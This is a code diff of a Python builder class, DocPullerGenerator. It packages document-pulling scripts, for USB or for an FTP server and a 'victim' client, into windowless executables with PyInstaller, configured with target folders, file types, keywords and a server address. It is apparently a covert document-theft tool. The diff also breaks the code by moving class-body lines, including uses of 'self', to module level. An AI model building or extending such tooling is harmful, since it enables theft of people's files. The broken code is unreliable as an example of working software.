@@ -15,42 +15,43 @@ class DocPullerGenerator:
         self.server_ip = server_ip
         self.server_port = server_port
         self.DOCPULLER_USB_PATH = 'Generator/docpullerscrip.py'
-        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscrip.py'
-        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/victimscrip.py'
+        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/clientscript.py'
+        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscript.py'
 
-        # Specify additional PyInstaller options if needed
-        self.command = [
-            "pyinstaller",
-            "--onefile",
-            "--noconsole",
-            f"--distpath={self.save_dir}"
-        ]
+self.command = [
+    "pyinstaller",
+    "--onefile",
+    "--noconsole",
+    f"--distpath={self.save_dir}"
+]
 
-        ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()
 
-    def main(self):
-        if self.is_usb:
-            print('genarating exe')
+ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()
 
-            command = self.command + [self.DOCPULLER_USB_PATH]
-            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                       universal_newlines=True)
-            execute.communicate()
-            print('done!')
 
-        else:
-            print('genarating server exe')
+def main(self):
+    if self.is_usb:
+        print('genarating exe')
 
-            command = self.command + [self.DOCPULLER_FTP_SERVER_PATH]
-            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                       universal_newlines=True)
-            execute.communicate()
+        command = self.command + [self.DOCPULLER_USB_PATH]
+        execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+        execute.communicate()
+        print('done!')
 
-            print('genarating victim exe')
+    else:
+        print('genarating server exe')
 
-            command = self.command + [self.DOCPULLER_FTP_CLIENT_PATH]
-            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                       universal_newlines=True)
-            execute.communicate()
+        command = self.command + [self.DOCPULLER_FTP_SERVER_PATH]
+        execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+        execute.communicate()
 
-            print('Done!')
+        print('genarating victim exe')
+
+        command = self.command + [self.DOCPULLER_FTP_CLIENT_PATH]
+        execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+        execute.communicate()
+
+        print('Done!')
